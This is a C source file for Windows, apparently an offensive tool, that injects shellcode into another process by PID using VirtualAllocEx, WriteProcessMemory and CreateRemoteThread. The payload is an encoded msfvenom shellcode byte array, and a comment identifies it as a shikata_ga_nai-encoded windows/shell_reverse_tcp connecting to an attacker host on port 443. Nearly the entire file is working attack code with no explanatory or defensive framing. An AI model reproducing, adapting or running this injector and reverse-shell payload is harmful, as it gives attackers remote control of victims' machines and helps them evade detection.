#include <Windows.h>
#include <stdio.h>

bool inject(DWORD pid, LPVOID shellcode, DWORD scSize)
{
	HANDLE hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, pid);

	if (!hProc)
	{
		printf("[!] Error: couldn't obtain a handle to process\n");
		return false;
	}

	LPVOID memAddr = VirtualAllocEx(hProc, NULL, scSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (!memAddr)
	{
		printf("[!] Error: couldn't allocate memory in remote process\n");
		CloseHandle(hProc);
		return false;
	}

	DWORD bytesWritten = 0;
	WriteProcessMemory(hProc, memAddr, shellcode, scSize, &bytesWritten);

	if (!bytesWritten)
	{
		printf("[!] Error: couldn't write to remote process\n");
		CloseHandle(hProc);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)memAddr, 0, 0, NULL);

	if (!hThread)
	{
		printf("[!] Error: couldn't create remote thread\n");
		CloseHandle(hProc);
		return false;
	}
	else {
		CloseHandle(hProc);
		return true;
	}
}

int main(int argc, char** argv)
{
	// msfvenom -p windows/shell_reverse_tcp lhost=`getip` lport=443 exitfunc=thread --platform win -a x86 -e x86/shikata_ga_nai -f c -b "\x00"
	char shellCode[] =	"\xb8\x03\xd9\x1b\x72\xdb\xd1\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
						"\x52\x31\x47\x12\x83\xef\xfc\x03\x44\xd7\xf9\x87\xb6\x0f\x7f"
						"\x67\x46\xd0\xe0\xe1\xa3\xe1\x20\x95\xa0\x52\x91\xdd\xe4\x5e"
						"\x5a\xb3\x1c\xd4\x2e\x1c\x13\x5d\x84\x7a\x1a\x5e\xb5\xbf\x3d"
						"\xdc\xc4\x93\x9d\xdd\x06\xe6\xdc\x1a\x7a\x0b\x8c\xf3\xf0\xbe"
						"\x20\x77\x4c\x03\xcb\xcb\x40\x03\x28\x9b\x63\x22\xff\x97\x3d"
						"\xe4\xfe\x74\x36\xad\x18\x98\x73\x67\x93\x6a\x0f\x76\x75\xa3"
						"\xf0\xd5\xb8\x0b\x03\x27\xfd\xac\xfc\x52\xf7\xce\x81\x64\xcc"
						"\xad\x5d\xe0\xd6\x16\x15\x52\x32\xa6\xfa\x05\xb1\xa4\xb7\x42"
						"\x9d\xa8\x46\x86\x96\xd5\xc3\x29\x78\x5c\x97\x0d\x5c\x04\x43"
						"\x2f\xc5\xe0\x22\x50\x15\x4b\x9a\xf4\x5e\x66\xcf\x84\x3d\xef"
						"\x3c\xa5\xbd\xef\x2a\xbe\xce\xdd\xf5\x14\x58\x6e\x7d\xb3\x9f"
						"\x91\x54\x03\x0f\x6c\x57\x74\x06\xab\x03\x24\x30\x1a\x2c\xaf"
						"\xc0\xa3\xf9\x60\x90\x0b\x52\xc1\x40\xec\x02\xa9\x8a\xe3\x7d"
						"\xc9\xb5\x29\x16\x60\x4c\xba\xd9\xdd\x4f\x3f\xb2\x1f\x4f\x3e"
						"\xf9\xa9\xa9\x2a\xed\xff\x62\xc3\x94\xa5\xf8\x72\x58\x70\x85"
						"\xb5\xd2\x77\x7a\x7b\x13\xfd\x68\xec\xd3\x48\xd2\xbb\xec\x66"
						"\x7a\x27\x7e\xed\x7a\x2e\x63\xba\x2d\x67\x55\xb3\xbb\x95\xcc"
						"\x6d\xd9\x67\x88\x56\x59\xbc\x69\x58\x60\x31\xd5\x7e\x72\x8f"
						"\xd6\x3a\x26\x5f\x81\x94\x90\x19\x7b\x57\x4a\xf0\xd0\x31\x1a"
						"\x85\x1a\x82\x5c\x8a\x76\x74\x80\x3b\x2f\xc1\xbf\xf4\xa7\xc5"
						"\xb8\xe8\x57\x29\x13\xa9\x78\xc8\xb1\xc4\x10\x55\x50\x65\x7d"
						"\x66\x8f\xaa\x78\xe5\x25\x53\x7f\xf5\x4c\x56\x3b\xb1\xbd\x2a"
						"\x54\x54\xc1\x99\x55\x7d";



	DWORD scSize = ((sizeof(shellCode) / sizeof(*shellCode)) - 1);

	if (argc != 2)
	{
		printf("[!] usage: %s <pid>\n", argv[0]);
		getchar();
		exit(0);
	}

	if (inject(atoi(argv[1]), &shellCode, scSize))
	{
		printf("[+] Successfully injected in pid %d !\n",atoi(argv[1]));
	}
	else {
		printf("[!] Failed to inject!\n");
	}
	printf("Press any key to continue...\n");
	getchar();

}
